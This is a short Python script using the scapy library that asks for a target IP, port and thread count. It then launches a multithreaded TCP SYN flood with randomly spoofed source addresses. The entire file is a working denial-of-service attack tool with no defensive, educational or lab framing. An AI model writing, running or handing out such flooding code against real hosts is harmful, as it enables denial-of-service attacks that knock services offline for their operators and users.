#!/usr/bin/python
import random
from scapy.all import *
import threading
import sys

target_ip=str(raw_input('sys_flood_target:'))
target_port=int(raw_input('sys_flood_target_port:'))
target_count=int(raw_input('sys_flood_thread:'))

def sys_flood(tg_ip,tg_p):
    try:
        while True:
            ip=str(random.randint(1,254))+'.'+str(random.randint(1,254))+'.'+str(random.randint(1,254))+'.'+str(random.randint(1,254))
            send(IP(src=ip,dst=tg_ip)/TCP(dport=tg_p,flags='S'))

    except:
        print 'Error!'
        sys.exit(0)



if __name__ == '__main__':
    sys_flood_thread=[]
    try:
        for i in range(target_count):
            sys_flood_thread.append(threading.Thread(target=sys_flood,args=(target_ip,target_port)))

        for i in sys_flood_thread:
            i.start()
    except:
        sys.exit(0)


